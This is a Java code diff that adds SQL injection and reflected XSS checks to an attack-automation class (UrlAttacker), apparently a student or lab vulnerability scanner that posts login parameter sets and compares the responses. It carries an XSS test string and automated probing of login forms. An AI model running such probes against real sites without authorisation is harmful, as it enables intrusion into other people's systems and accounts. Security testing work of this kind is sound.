@@ -93,6 +93,13 @@ public class UrlAttacker {
         if(attack instanceof Attacks.BruteforceAttack){
             return bruteforceAttack((Attacks.BruteforceAttack) attack);
         }
+        //Two more attacks added
+        if(attack instanceof Attacks.XSSAttack){
+            return XSSAttack((Attacks.XSSAttack) attack);
+        }
+         if(attack instanceof Attacks.SQLAttack){
+            return SQLinjectionAttack((Attacks.SQLAttack) attack);
+        }
         return null;
     }
 
@@ -115,4 +122,61 @@ public class UrlAttacker {
         }
         return successfulParamSets;
     }
+        /*SQL With the following naive approach. I check the input against a control input which is blank.
+        That follows the rationale that if an empty String is given as username and password there should be
+        no table return (still not clever for all cases). Better aproach could be 1. To have a valid account
+        in the server to attack and check against that input or 2. Use a table of cases to find the error message
+        againt bad login and test against that message. The test is the classic SQL query.
+        */
+        private static List<List<NameValuePair>> SQLinjectionAttack(Attacks.SQLAttack attack){
+            if(attack==null || attack.url == null) { return null; }
+
+            List<List<NameValuePair>> successfulParamSets = new ArrayList<>();
+
+            HttpClient httpclient = HttpClients.createDefault();
+
+            for (List<NameValuePair> paramsSet : attack.paramsBatch) {
+                
+                List<NameValuePair> control = new ArrayList<NameValuePair>(3);
+                control.add(new BasicNameValuePair("username", ""));
+                control.add(new BasicNameValuePair("password", ""));
+                control.add(new BasicNameValuePair("SubmitButton3", "")); 
+                
+                HttpPost httppost_control = constructRequest(attack.url, control);
+                String response_control = getResponse(httpclient, httppost_control);
+                
+                HttpPost httppost = constructRequest(attack.url, paramsSet);
+                String response = getResponse(httpclient, httppost);
+
+                if(response != null && response_control !=null && response.compareTo(response_control)!=0){
+                    System.out.println("Success on: SQL injection");
+                    //System.out.println(response);
+                    successfulParamSets.add(paramsSet);
+                }
+            }
+            return successfulParamSets;
+        }
+        
+        /*
+         XSS Attack. Send an XSS code. If returns back intact, effectivly meaning that the brower would run it, print Success
+         and return the parametres.
+        */
+         private static List<List<NameValuePair>> XSSAttack(Attacks.XSSAttack attack){
+            if(attack==null || attack.url == null) { return null; }
+
+            List<List<NameValuePair>> successfulParamSets = new ArrayList<>();
+ 
+            HttpClient httpclient = HttpClients.createDefault();
+
+            for (List<NameValuePair> paramsSet : attack.paramsBatch) {
+                HttpPost httppost = constructRequest(attack.url, paramsSet);
+                String response = getResponse(httpclient, httppost);
+
+                if(response != null  && response.contains("<script> alert(123) </script>")){
+                    System.out.println("Success on: XSS attack");
+                    successfulParamSets.add(paramsSet);
+                }
+            }
+            return successfulParamSets;
+        }
 }
